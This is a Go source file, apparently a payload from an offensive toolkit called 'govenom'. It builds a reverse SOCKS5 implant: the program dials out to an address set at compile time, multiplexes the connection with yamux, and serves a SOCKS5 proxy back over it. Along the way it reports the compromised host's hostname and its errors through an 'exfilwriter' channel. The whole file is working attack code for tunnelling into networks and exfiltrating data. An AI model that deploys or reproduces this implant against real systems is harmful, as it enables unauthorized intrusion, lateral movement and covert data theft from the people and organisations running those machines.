package main

import (
	"fmt"
	"govenom/payloads/exfilwriter"
	"log"
	"net"
	"os"
	"time"

	socks5 "github.com/armon/go-socks5"
	"github.com/hashicorp/yamux"
)

var (
	// set during compilation via -X ldflag
	address      string
	exfilCfg     string
	exfilTimeout string
)

func main() {
	timeout := 3 * time.Second

	if exfilTimeout != "" {
		dt, err := time.ParseDuration(exfilTimeout)
		if err == nil {
			timeout = dt
		}
	}

	w, errs := exfilwriter.New(exfilCfg, timeout)

	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	log := log.New(w, fmt.Sprintf("%s: ", hostname), 0)

	if len(errs) > 0 {
		for _, err := range errs {
			log.Println(err)
		}
	}

	conn, err := net.Dial("tcp", address)
	if err != nil {
		log.Fatal(err.Error())
	}

	log.Printf("connected to %s", conn.RemoteAddr())

	defer conn.Close()

	yamuxServer, err := yamux.Server(conn, nil)
	if err != nil {
		log.Printf("connection multiplexer setup: %v", err)
		return
	}

	socksServer, err := socks5.New(&socks5.Config{})
	if err != nil {
		log.Printf("socks5 server setup: %v\n", err)
		return
	}

	err = socksServer.Serve(yamuxServer)
	if err != nil {
		log.Printf("socks5 serve: %v", err)
		return
	}
}
